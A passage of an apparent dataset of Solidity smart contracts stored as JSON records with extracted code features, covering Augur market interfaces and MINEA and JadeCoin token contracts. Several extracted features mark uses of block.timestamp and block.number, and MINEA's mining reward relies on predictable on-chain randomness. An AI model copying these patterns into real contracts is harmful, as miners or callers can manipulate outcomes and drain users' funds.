logReportingParticipantDisavowed(IUniverse _universe, IMarket _market) public returns (bool);\n function logMarketParticipantsDisavowed(IUniverse _universe) public returns (bool);\n function logOrderCanceled(IUniverse _universe, address _shareToken, address _sender, bytes32 _orderId, Order.Types _orderType, uint256 _tokenRefund, uint256 _sharesRefund) public returns (bool);\n function logOrderCreated(Order.Types _orderType, uint256 _amount, uint256 _price, address _creator, uint256 _moneyEscrowed, uint256 _sharesEscrowed, bytes32 _tradeGroupId, bytes32 _orderId, IUniverse _universe, address _shareToken) public returns (bool);\n function logOrderFilled(IUniverse _universe, address _shareToken, address _filler, bytes32 _orderId, uint256 _numCreatorShares, uint256 _numCreatorTokens, uint256 _numFillerShares, uint256 _numFillerTokens, uint256 _marketCreatorFees, uint256 _reporterFees, uint256 _amountFilled, bytes32 _tradeGroupId) public returns (bool);\n function logCompleteSetsPurchased(IUniverse _universe, IMarket _market, address _account, uint256 _numCompleteSets) public returns (bool);\n function logCompleteSetsSold(IUniverse _universe, IMarket _market, address _account, uint256 _numCompleteSets) public returns (bool);\n function logTradingProceedsClaimed(IUniverse _universe, address _shareToken, address _sender, address _market, uint256 _numShares, uint256 _numPayoutTokens, uint256 _finalTokenBalance) public returns (bool);\n function logUniverseForked() public returns (bool);\n function logFeeWindowTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logReputationTokensTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logDisputeCrowdsourcerTokensTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logShareTokensTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logReputationTokenBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logReputationTokenMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logShareTokenBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logShareTokenMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logFeeWindowBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logFeeWindowMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logDisputeCrowdsourcerTokensBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logDisputeCrowdsourcerTokensMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logFeeWindowCreated(IFeeWindow _feeWindow, uint256 _id) public returns (bool);\n function logFeeTokenTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logFeeTokenBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logFeeTokenMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logTimestampSet(uint256 _newTimestamp) public returns (bool);\n function logInitialReporterTransferred(IUniverse _universe, IMarket _market, address _from, address _to) public returns (bool);\n function logMarketTransferred(IUniverse _universe, address _from, address _to) public returns (bool);\n function logMarketMailboxTransferred(IUniverse _universe, IMarket _market, address _from, address _to) public returns (bool);\n function logEscapeHatchChanged(bool _isOn) public returns (bool);\n}\ncontract IControlled {\n function getController() public view returns (IController);\n function setController(IController _controller) public returns(bool);\n}\ncontract Controlled is IControlled {\n IController internal controller;\n modifier onlyWhitelistedCallers {\n require(controller.assertIsWhitelisted(msg.sender));\n _;\n }\n modifier onlyCaller(bytes32 _key) {\n require(msg.sender == controller.lookup(_key));\n _;\n }\n modifier onlyControllerCaller {\n require(IController(msg.sender) == controller);\n _;\n }\n modifier onlyInGoodTimes {\n require(controller.stopInEmergency());\n _;\n }\n modifier onlyInBadTimes {\n require(controller.onlyInEmergency());\n _;\n }\n function Controlled() public {\n controller = IController(msg.sender);\n }\n function getController() public view returns(IController) {\n return controller;\n }\n function setController(IController _controller) public onlyControllerCaller returns(bool) {\n controller = _controller;\n return true;\n }\n}\ncontract IController {\n function assertIsWhitelisted(address _target) public view returns(bool);\n function lookup(bytes32 _key) public view returns(address);\n function stopInEmergency() public view returns(bool);\n function onlyInEmergency() public view returns(bool);\n function getAugur() public view returns (IAugur);\n function getTimestamp() public view returns (uint256);\n}\ncontract IOwnable {\n function getOwner() public view returns (address);\n function transferOwnership(address newOwner) public returns (bool);\n}\ncontract ITyped {\n function getTypeName() public view returns (bytes32);\n}\ncontract ITime is Controlled, ITyped {\n function getTimestamp() external view returns (uint256);\n}\ncontract Time is ITime {\n function getTimestamp() external view returns (uint256) {\n return block.timestamp;\n }\n function getTypeName() public view returns (bytes32) {\n return \"Time\";\n }\n}\ncontract Initializable {\n bool private initialized = false;\n modifier afterInitialized {\n require(initialized);\n _;\n }\n modifier beforeInitialized {\n require(!initialized);\n _;\n }\n function endInitialization() internal beforeInitialized returns (bool) {\n initialized = true;\n return true;\n }\n function getInitialized() public view returns (bool) {\n return initialized;\n }\n}\nlibrary SafeMathUint256 {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n require(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n require(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a);\n return c;\n }\n function min(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a <= b) {\n return a;\n } else {\n return b;\n }\n }\n function max(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a >= b) {\n return a;\n } else {\n return b;\n }\n }\n function getUint256Min() internal pure returns (uint256) {\n return 0;\n }\n function getUint256Max() internal pure returns (uint256) {\n return 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n }\n function isMultipleOf(uint256 a, uint256 b) internal pure returns (bool) {\n return a % b == 0;\n }\n function fxpMul(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {\n return div(mul(a, b), base);\n }\n function fxpDiv(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {\n return div(mul(a, base), b);\n }\n}\ncontract ERC20Basic {\n event Transfer(address indexed from, address indexed to, uint256 value);\n function balanceOf(address _who) public view returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n function totalSupply() public view returns (uint256);\n}\ncontract ERC20 is ERC20Basic {\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function allowance(address _owner, address _spender) public view returns (uint256);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool);\n function approve(address _spender, uint256 _value) public returns (bool);\n}\ncontract IFeeToken is ERC20, Initializable {\n function initialize(IFeeWindow _feeWindow) public returns (bool);\n function getFeeWindow() public view returns (IFeeWindow);\n function feeWindowBurn(address _target, uint256 _amount) public returns (bool);\n function mintForReportingParticipant(address _target, uint256 _amount) public returns (bool);\n}\ncontract IFeeWindow is ITyped, ERC20 {\n function initialize(IUniverse _universe, uint256 _feeWindowId) public returns (bool);\n function getUniverse() public view returns (IUniverse);\n function getReputationToken() public view returns (IReputationToken);\n function getStartTime() public view returns (uint256);\n function getEndTime() public view returns (uint256);\n function getNumMarkets() public view returns (uint256);\n function getNumInvalidMarkets() public view returns (uint256);\n function getNumIncorrectDesignatedReportMarkets() public view returns (uint256);\n function getNumDesignatedReportNoShows() public view returns (uint256);\n function getFeeToken() public view returns (IFeeToken);\n function isActive() public view returns (bool);\n function isOver() public view returns (bool);\n function onMarketFinalized() public returns (bool);\n function buy(uint256 _attotokens) public returns (bool);\n function redeem(address _sender) public returns (bool);\n function redeemForReportingParticipant() public returns (bool);\n function mintFeeTokens(uint256 _amount) public returns (bool);\n function trustedUniverseBuy(address _buyer, uint256 _attotokens) public returns (bool);\n}\ncontract IMailbox {\n function initialize(address _owner, IMarket _market) public returns (bool);\n function depositEther() public payable returns (bool);\n}\ncontract IMarket is ITyped, IOwnable {\n enum MarketType {\n YES_NO,\n CATEGORICAL,\n SCALAR\n }\n function initialize(IUniverse _universe, uint256 _endTime, uint256 _feePerEthInAttoeth, ICash _cash, address _designatedReporterAddress, address _creator, uint256 _numOutcomes, uint256 _numTicks) public payable returns (bool _success);\n function derivePayoutDistributionHash(uint256[] _payoutNumerators, bool _invalid) public view returns (bytes32);\n function getUniverse() public view returns (IUniverse);\n function getFeeWindow() public view returns (IFeeWindow);\n function getNumberOfOutcomes() public view returns (uint256);\n function getNumTicks() public view returns (uint256);\n function getDenominationToken() public view returns (ICash);\n function getShareToken(uint256 _outcome) public view returns (IShareToken);\n function getMarketCreatorSettlementFeeDivisor() public view returns (uint256);\n function getForkingMarket() public view returns (IMarket _market);\n function getEndTime() public view returns (uint256);\n function getMarketCreatorMailbox() public view returns (IMailbox);\n function getWinningPayoutDistributionHash() public view returns (bytes32);\n function getWinningPayoutNumerator(uint256 _outcome) public view returns (uint256);\n function getReputationToken() public view returns (IReputationToken);\n function getFinalizationTime() public view returns (uint256);\n function getInitialReporterAddress() public view returns (address);\n function deriveMarketCreatorFeeAmount(uint256 _amount) public view returns (uint256);\n function isContainerForShareToken(IShareToken _shadyTarget) public view returns (bool);\n function isContainerForReportingParticipant(IReportingParticipant _reportingParticipant) public view returns (bool);\n function isInvalid() public view returns (bool);\n function finalize() public returns (bool);\n function designatedReporterWasCorrect() public view returns (bool);\n function designatedReporterShowed() public view returns (bool);\n function isFinalized() public view returns (bool);\n function finalizeFork() public returns (bool);\n function assertBalances() public view returns (bool);\n}\ncontract IReportingParticipant {\n function getStake() public view returns (uint256);\n function getPayoutDistributionHash() public view returns (bytes32);\n function liquidateLosing() public returns (bool);\n function redeem(address _redeemer) public returns (bool);\n function isInvalid() public view returns (bool);\n function isDisavowed() public view returns (bool);\n function migrate() public returns (bool);\n function getPayoutNumerator(uint256 _outcome) public view returns (uint256);\n function getMarket() public view returns (IMarket);\n function getSize() public view returns (uint256);\n}\ncontract IDisputeCrowdsourcer is IReportingParticipant, ERC20 {\n function initialize(IMarket market, uint256 _size, bytes32 _payoutDistributionHash, uint256[] _payoutNumerators, bool _invalid) public returns (bool);\n function contribute(address _participant, uint256 _amount) public returns (uint256);\n}\ncontract IReputationToken is ITyped, ERC20 {\n function initialize(IUniverse _universe) public returns (bool);\n function migrateOut(IReputationToken _destination, uint256 _attotokens) public returns (bool);\n function migrateIn(address _reporter, uint256 _attotokens) public returns (bool);\n function trustedReportingParticipantTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedMarketTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedFeeWindowTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedUniverseTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function getUniverse() public view returns (IUniverse);\n function getTotalMigrated() public view returns (uint256);\n function getTotalTheoreticalSupply() public view returns (uint256);\n function mintForReportingParticipant(uint256 _amountMigrated) public returns (bool);\n}\ncontract IUniverse is ITyped {\n function initialize(IUniverse _parentUniverse, bytes32 _parentPayoutDistributionHash) external returns (bool);\n function fork() public returns (bool);\n function getParentUniverse() public view returns (IUniverse);\n function createChildUniverse(uint256[] _parentPayoutNumerators, bool _invalid) public returns (IUniverse);\n function getChildUniverse(bytes32 _parentPayoutDistributionHash) public view returns (IUniverse);\n function getReputationToken() public view returns (IReputationToken);\n function getForkingMarket() public view returns (IMarket);\n function getForkEndTime() public view returns (uint256);\n function getForkReputationGoal() public view returns (uint256);\n function getParentPayoutDistributionHash() public view returns (bytes32);\n function getDisputeRoundDurationInSeconds() public view returns (uint256);\n function getOrCreateFeeWindowByTimestamp(uint256 _timestamp) public returns (IFeeWindow);\n function getOrCreateCurrentFeeWindow() public returns (IFeeWindow);\n function getOrCreateNextFeeWindow() public returns (IFeeWindow);\n function getOpenInterestInAttoEth() public view returns (uint256);\n function getRepMarketCapInAttoeth() public view returns (uint256);\n function getTargetRepMarketCapInAttoeth() public view returns (uint256);\n function getOrCacheValidityBond() public returns (uint256);\n function getOrCacheDesignatedReportStake() public returns (uint256);\n function getOrCacheDesignatedReportNoShowBond() public returns (uint256);\n function getOrCacheReportingFeeDivisor() public returns (uint256);\n function getDisputeThresholdForFork() public view returns (uint256);\n function getInitialReportMinValue() public view returns (uint256);\n function calculateFloatingValue(uint256 _badMarkets, uint256 _totalMarkets, uint256 _targetDivisor, uint256 _previousValue, uint256 _defaultValue, uint256 _floor) public pure returns (uint256 _newValue);\n function getOrCacheMarketCreationCost() public returns (uint256);\n function getCurrentFeeWindow() public view returns (IFeeWindow);\n function getOrCreateFeeWindowBefore(IFeeWindow _feeWindow) public returns (IFeeWindow);\n function isParentOf(IUniverse _shadyChild) public view returns (bool);\n function updateTentativeWinningChildUniverse(bytes32 _parentPayoutDistributionHash) public returns (bool);\n function isContainerForFeeWindow(IFeeWindow _shadyTarget) public view returns (bool);\n function isContainerForMarket(IMarket _shadyTarget) public view returns (bool);\n function isContainerForReportingParticipant(IReportingParticipant _reportingParticipant) public view returns (bool);\n function isContainerForShareToken(IShareToken _shadyTarget) public view returns (bool);\n function isContainerForFeeToken(IFeeToken _shadyTarget) public view returns (bool);\n function addMarketTo() public returns (bool);\n function removeMarketFrom() public returns (bool);\n function decrementOpenInterest(uint256 _amount) public returns (bool);\n function decrementOpenInterestFromMarket(uint256 _amount) public returns (bool);\n function incrementOpenInterest(uint256 _amount) public returns (bool);\n function incrementOpenInterestFromMarket(uint256 _amount) public returns (bool);\n function getWinningChildUniverse() public view returns (IUniverse);\n function isForking() public view returns (bool);\n}\ncontract ICash is ERC20 {\n function depositEther() external payable returns(bool);\n function depositEtherFor(address _to) external payable returns(bool);\n function withdrawEther(uint256 _amount) external returns(bool);\n function withdrawEtherTo(address _to, uint256 _amount) external returns(bool);\n function withdrawEtherToIfPossible(address _to, uint256 _amount) external returns (bool);\n}\ncontract IOrders {\n function saveOrder(Order.Types _type, IMarket _market, uint256 _fxpAmount, uint256 _price, address _sender, uint256 _outcome, uint256 _moneyEscrowed, uint256 _sharesEscrowed, bytes32 _betterOrderId, bytes32 _worseOrderId, bytes32 _tradeGroupId) public returns (bytes32 _orderId);\n function removeOrder(bytes32 _orderId) public returns (bool);\n function getMarket(bytes32 _orderId) public view returns (IMarket);\n function getOrderType(bytes32 _orderId) public view returns (Order.Types);\n function getOutcome(bytes32 _orderId) public view returns (uint256);\n function getAmount(bytes32 _orderId) public view returns (uint256);\n function getPrice(bytes32 _orderId) public view returns (uint256);\n function getOrderCreator(bytes32 _orderId) public view returns (address);\n function getOrderSharesEscrowed(bytes32 _orderId) public view returns (uint256);\n function getOrderMoneyEscrowed(bytes32 _orderId) public view returns (uint256);\n function getBetterOrderId(bytes32 _orderId) public view returns (bytes32);\n function getWorseOrderId(bytes32 _orderId) public view returns (bytes32);\n function getBestOrderId(Order.Types _type, IMarket _market, uint256 _outcome) public view returns (bytes32);\n function getWorstOrderId(Order.Types _type, IMarket _market, uint256 _outcome) public view returns (bytes32);\n function getLastOutcomePrice(IMarket _market, uint256 _outcome) public view returns (uint256);\n function getOrderId(Order.Types _type, IMarket _market, uint256 _fxpAmount, uint256 _price, address _sender, uint256 _blockNumber, uint256 _outcome, uint256 _moneyEscrowed, uint256 _sharesEscrowed) public pure returns (bytes32);\n function getTotalEscrowed(IMarket _market) public view returns (uint256);\n function isBetterPrice(Order.Types _type, uint256 _price, bytes32 _orderId) public view returns (bool);\n function isWorsePrice(Order.Types _type, uint256 _price, bytes32 _orderId) public view returns (bool);\n function assertIsNotBetterPrice(Order.Types _type, uint256 _price, bytes32 _betterOrderId) public view returns (bool);\n function assertIsNotWorsePrice(Order.Types _type, uint256 _price, bytes32 _worseOrderId) public returns (bool);\n function recordFillOrder(bytes32 _orderId, uint256 _sharesFilled, uint256 _tokensFilled) public returns (bool);\n function setPrice(IMarket _market, uint256 _outcome, uint256 _price) external returns (bool);\n function incrementTotalEscrowed(IMarket _market, uint256 _amount) external returns (bool);\n function decrementTotalEscrowed(IMarket _market, uint256 _amount) external returns (bool);\n}\ncontract IShareToken is ITyped, ERC20 {\n function initialize(IMarket _market, uint256 _outcome) external returns (bool);\n function createShares(address _owner, uint256 _amount) external returns (bool);\n function destroyShares(address, uint256 balance) external returns (bool);\n function getMarket() external view returns (IMarket);\n function getOutcome() external view returns (uint256);\n function trustedOrderTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedFillOrderTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedCancelOrderTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n}\nlibrary Order {\n using SafeMathUint256 for uint256;\n enum Types {\n Bid, Ask\n }\n enum TradeDirections {\n Long, Short\n }\n struct Data {\n IOrders orders;\n IMarket market;\n IAugur augur;\n bytes32 id;\n address creator;\n uint256 outcome;\n Order.Types orderType;\n uint256 amount;\n uint256 price;\n uint256 sharesEscrowed;\n uint256 moneyEscrowed;\n bytes32 betterOrderId;\n bytes32 worseOrderId;\n }\n function create(IController _controller, address _creator, uint256 _outcome, Order.Types _type, uint256 _attoshares, uint256 _price, IMarket _market, bytes32 _betterOrderId, bytes32 _worseOrderId) internal view returns (Data) {\n require(_outcome < _market.getNumberOfOutcomes());\n require(_price < _market.getNumTicks());\n IOrders _orders = IOrders(_controller.lookup(\"Orders\"));\n IAugur _augur = _controller.getAugur();\n return Data({\n orders: _orders,\n market: _market,\n augur: _augur,\n id: 0,\n creator: _creator,\n outcome: _outcome,\n orderType: _type,\n amount: _attoshares,\n price: _price,\n sharesEscrowed: 0,\n moneyEscrowed: 0,\n betterOrderId: _betterOrderId,\n worseOrderId: _worseOrderId\n });\n }\n function getOrderId(Order.Data _orderData) internal view returns (bytes32) {\n if (_orderData.id == bytes32(0)) {\n bytes32 _orderId = _orderData.orders.getOrderId(_orderData.orderType, _orderData.market, _orderData.amount, _orderData.price, _orderData.creator, block.number, _orderData.outcome, _orderData.moneyEscrowed, _orderData.sharesEscrowed);\n require(_orderData.orders.getAmount(_orderId) == 0);\n _orderData.id = _orderId;\n }\n return _orderData.id;\n }\n function getOrderTradingTypeFromMakerDirection(Order.TradeDirections _creatorDirection) internal pure returns (Order.Types) {\n return (_creatorDirection == Order.TradeDirections.Long) ? Order.Types.Bid : Order.Types.Ask;\n }\n function getOrderTradingTypeFromFillerDirection(Order.TradeDirections _fillerDirection) internal pure returns (Order.Types) {\n return (_fillerDirection == Order.TradeDirections.Long) ? Order.Types.Ask : Order.Types.Bid;\n }\n function escrowFunds(Order.Data _orderData) internal returns (bool) {\n if (_orderData.orderType == Order.Types.Ask) {\n return escrowFundsForAsk(_orderData);\n } else if (_orderData.orderType == Order.Types.Bid) {\n return escrowFundsForBid(_orderData);\n }\n }\n function saveOrder(Order.Data _orderData, bytes32 _tradeGroupId) internal returns (bytes32) {\n return _orderData.orders.saveOrder(_orderData.orderType, _orderData.market, _orderData.amount, _orderData.price, _orderData.creator, _orderData.outcome, _orderData.moneyEscrowed, _orderData.sharesEscrowed, _orderData.betterOrderId, _orderData.worseOrderId, _tradeGroupId);\n }\n function escrowFundsForBid(Order.Data _orderData) private returns (bool) {\n require(_orderData.moneyEscrowed == 0);\n require(_orderData.sharesEscrowed == 0);\n uint256 _attosharesToCover = _orderData.amount;\n uint256 _numberOfOutcomes = _orderData.market.getNumberOfOutcomes();\n uint256 _attosharesHeld = 2**254;\n for (uint256 _i = 0; _i < _numberOfOutcomes; _i++) {\n if (_i != _orderData.outcome) {\n uint256 _creatorShareTokenBalance = _orderData.market.getShareToken(_i).balanceOf(_orderData.creator);\n _attosharesHeld = SafeMathUint256.min(_creatorShareTokenBalance, _attosharesHeld);\n }\n }\n if (_attosharesHeld > 0) {\n _orderData.sharesEscrowed = SafeMathUint256.min(_attosharesHeld, _attosharesToCover);\n _attosharesToCover -= _orderData.sharesEscrowed;\n for (_i = 0; _i < _numberOfOutcomes; _i++) {\n if (_i != _orderData.outcome) {\n _orderData.market.getShareToken(_i).trustedOrderTransfer(_orderData.creator, _orderData.market, _orderData.sharesEscrowed);\n }\n }\n }\n if (_attosharesToCover > 0) {\n _orderData.moneyEscrowed = _attosharesToCover.mul(_orderData.price);\n require(_orderData.augur.trustedTransfer(_orderData.market.getDenominationToken(), _orderData.creator, _orderData.market, _orderData.moneyEscrowed));\n }\n return true;\n }\n function escrowFundsForAsk(Order.Data _orderData) private returns (bool) {\n require(_orderData.moneyEscrowed == 0);\n require(_orderData.sharesEscrowed == 0);\n IShareToken _shareToken = _orderData.market.getShareToken(_orderData.outcome);\n uint256 _attosharesToCover = _orderData.amount;\n uint256 _attosharesHeld = _shareToken.balanceOf(_orderData.creator);\n if (_attosharesHeld > 0) {\n _orderData.sharesEscrowed = SafeMathUint256.min(_attosharesHeld, _attosharesToCover);\n _attosharesToCover -= _orderData.sharesEscrowed;\n _shareToken.trustedOrderTransfer(_orderData.creator, _orderData.market, _orderData.sharesEscrowed);\n }\n if (_attosharesToCover > 0) {\n _orderData.moneyEscrowed = _orderData.market.getNumTicks().sub(_orderData.price).mul(_attosharesToCover);\n require(_orderData.augur.trustedTransfer(_orderData.market.getDenominationToken(), _orderData.creator, _orderData.market, _orderData.moneyEscrowed));\n }\n return true;\n }\n}",
  "extract_feature": [
    "function getTimestamp() external view returns (uint256) {\nreturn block.timestamp;\n}",
    "function getOrderId(Order.Data _orderData) internal view returns (bytes32) {\nif (_orderData.id == bytes32(0)) {\nbytes32 _orderId = _orderData.orders.getOrderId(_orderData.orderType, _orderData.market, _orderData.amount, _orderData.price, _orderData.creator, block.number, _orderData.outcome, _orderData.moneyEscrowed, _orderData.sharesEscrowed);\nrequire(_orderData.orders.getAmount(_orderId) == 0);\n_orderData.id = _orderId;\n}\nreturn _orderData.id;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f0a"
  },
  "filename": "6220.sol",
  "content": "pragma solidity ^0.4.19;\ncontract MINEA {\n string public name = 'MINEA';\n string public symbol = 'MINEA';\n uint8 public decimals = 18;\n uint public totalSupply = 10000000000000000000000000;\n uint public minted = totalSupply / 5;\n uint public minReward = 1000000000000000000;\n uint public fee = 700000000000000;\n uint public reducer = 1000;\n uint private randomNumber;\n address public owner;\n uint private ownerBalance;\n uint public bountyDurationInBlocks = 36000;\n uint public finishBountyAt;\n mapping (address => uint256) public balanceOf;\n mapping (address => uint256) public successesOf;\n mapping (address => uint256) public failsOf;\n mapping (address => mapping (address => uint256)) public allowance;\n event Transfer(address indexed from, address indexed to, uint256 value);\n modifier onlyOwner {\n if (msg.sender != owner) revert();\n _;\n }\n function transferOwnership(address newOwner) external onlyOwner {\n owner = newOwner;\n }\n function MINEA() public {\n owner = msg.sender;\n balanceOf[owner] = minted;\n balanceOf[this] = totalSupply - balanceOf[owner];\n finishBountyAt = block.number + bountyDurationInBlocks;\n }\n function _transfer(address _from, address _to, uint _value) internal {\n require(_to != 0x0);\n require(balanceOf[_from] >= _value);\n require(balanceOf[_to] + _value > balanceOf[_to]);\n uint previousBalances = balanceOf[_from] + balanceOf[_to];\n balanceOf[_from] -= _value;\n balanceOf[_to] += _value;\n Transfer(_from, _to, _value);\n assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n }\n function transfer(address _to, uint256 _value) external {\n _transfer(msg.sender, _to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) external returns (bool success) {\n require(_value <= allowance[_from][msg.sender]);\n allowance[_from][msg.sender] -= _value;\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) external returns (bool success) {\n allowance[msg.sender][_spender] = _value;\n return true;\n }\n function withdrawEther() external onlyOwner {\n owner.transfer(ownerBalance);\n ownerBalance = 0;\n }\n function () external payable {\n if (msg.value == fee) {\n randomNumber += block.timestamp + uint(msg.sender);\n uint minedAtBlock = uint(block.blockhash(block.number - 1));\n uint minedHashRel = uint(sha256(minedAtBlock + randomNumber + uint(msg.sender))) % 10000000;\n uint balanceRel = balanceOf[msg.sender] * 1000 / minted;\n uint reward;\n if (block.number < finishBountyAt) {\n reward = 50000000000000000000;\n _transfer(this, msg.sender, reward);\n minted += reward;\n successesOf[msg.sender]++;\n ownerBalance += fee;\n reducer++;\n } else if (balanceRel >= 1) {\n if (balanceRel > 255) {\n balanceRel = 255;\n }\n balanceRel = 2 ** balanceRel;\n balanceRel = 5000000 / balanceRel;\n balanceRel = 5000000 - balanceRel;\n if (minedHashRel < balanceRel) {\n reward = minReward + minedHashRel * 1000 / reducer * 100000000000000;\n _transfer(this, msg.sender, reward);\n minted += reward;\n successesOf[msg.sender]++;\n } else {\n Transfer(this, msg.sender, 0);\n failsOf[msg.sender]++;\n }\n ownerBalance += fee;\n reducer++;\n } else {\n revert();\n }\n } else {\n revert();\n }\n }\n}",
  "extract_feature": [
    "function MINEA() public {\nowner = msg.sender;\nbalanceOf[owner] = minted;\nbalanceOf[this] = totalSupply - balanceOf[owner];\nfinishBountyAt = block.number + bountyDurationInBlocks;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f0b"
  },
  "filename": "6272.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract AccessAdmin is Ownable {\n mapping (address => bool) adminContracts;\n mapping (address => bool) actionContracts;\n function setAdminContract(address _addr, bool _useful) public onlyOwner {\n require(_addr != address(0));\n adminContracts[_addr] = _useful;\n }\n modifier onlyAdmin {\n require(adminContracts[msg.sender]);\n _;\n }\n function setActionContract(address _actionAddr, bool _useful) public onlyAdmin {\n actionContracts[_actionAddr] = _useful;\n }\n modifier onlyAccess() {\n require(actionContracts[msg.sender]);\n _;\n }\n}\ninterface ERC20 {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract JadeCoin is ERC20, AccessAdmin {\n using SafeMath for SafeMath;\n string public constant name = \"MAGICACADEMY JADE\";\n string public constant symbol = \"Jade\";\n uint8 public constant decimals = 0;\n uint256 public roughSupply;\n uint256 public totalJadeProduction;\n uint256[] public totalJadeProductionSnapshots;\n uint256 public nextSnapshotTime;\n uint256 public researchDivPercent = 10;\n mapping(address => uint256) public jadeBalance;\n mapping(address => mapping(uint8 => uint256)) public coinBalance;\n mapping(uint8 => uint256) totalEtherPool;\n mapping(address => mapping(uint256 => uint256)) public jadeProductionSnapshots;\n mapping(address => mapping(uint256 => bool)) private jadeProductionZeroedSnapshots;\n mapping(address => uint256) public lastJadeSaveTime;\n mapping(address => uint256) public lastJadeProductionUpdate;\n mapping(address => uint256) private lastJadeResearchFundClaim;\n mapping(address => uint256) private lastJadeDepositFundClaim;\n uint256[] private allocatedJadeResearchSnapshots;\n mapping(address => mapping(address => uint256)) private allowed;\n event ReferalGain(address player, address referal, uint256 amount);\n function JadeCoin() public {\n }\n function() external payable {\n totalEtherPool[1] += msg.value;\n }\n function tweakDailyDividends(uint256 newResearchPercent) external {\n require(msg.sender == owner);\n require(newResearchPercent > 0 && newResearchPercent <= 10);\n researchDivPercent = newResearchPercent;\n }\n function totalSupply() public constant returns(uint256) {\n return roughSupply;\n }\n function balanceOf(address player) public constant returns(uint256) {\n return SafeMath.add(jadeBalance[player],balanceOfUnclaimed(player));\n }\n function balanceOfUnclaimed(address player) public constant returns (uint256) {\n uint256 lSave = lastJadeSaveTime[player];\n if (lSave > 0 && lSave < block.timestamp) {\n return SafeMath.mul(getJadeProduction(player),SafeMath.div(SafeMath.sub(block.timestamp,lSave),10));\n }\n return 0;\n }\n function getJadeProduction(address player) public constant returns (uint256){\n return jadeProductionSnapshots[player][lastJadeProductionUpdate[player]];\n }\n function getTotalJadeProduction() external view returns (uint256) {\n return totalJadeProduction;\n }\n function getlastJadeProductionUpdate(address player) public view returns (uint256) {\n return lastJadeProductionUpdate[player];\n }\n function increasePlayersJadeProduction(address player, uint256 increase) public onlyAccess {\n jadeProductionSnapshots[player][allocatedJadeResearchSnapshots.length] = SafeMath.add(getJadeProduction(player),increase);\n lastJadeProductionUpdate[player] = allocatedJadeResearchSnapshots.length;\n totalJadeProduction = SafeMath.add(totalJadeProduction,increase);\n }\n function reducePlayersJadeProduction(address player, uint256 decrease) public onlyAccess {\n uint256 previousProduction = getJadeProduction(player);\n uint256 newProduction = SafeMath.sub(previousProduction, decrease);\n if (newProduction == 0) {\n jadeProductionZeroedSnapshots[player][allocatedJadeResearchSnapshots.length] = true;\n delete jadeProductionSnapshots[player][allocatedJadeResearchSnapshots.length];\n } else {\n jadeProductionSnapshots[player][allocatedJadeResearchSnapshots.length] = newProduction;\n }\n lastJadeProductionUpdate[player] = allocatedJadeResearchSnapshots.length;\n totalJadeProduction = SafeMath.sub(totalJadeProduction,decrease);\n }\n function updatePlayersCoin(address player) internal {\n uint256 coinGain = balanceOfUnclaimed(player);\n lastJadeSaveTime[player] = block.timestamp;\n roughSupply = SafeMath.add(roughSupply,coinGain);\n jadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);\n }\n function updatePlayersCoinByOut(address player) external onlyAccess {\n uint256 coinGain = balanceOfUnclaimed(player);\n lastJadeSaveTime[player] = block.timestamp;\n roughSupply = SafeMath.add(roughSupply,coinGain);\n jadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);\n }\n 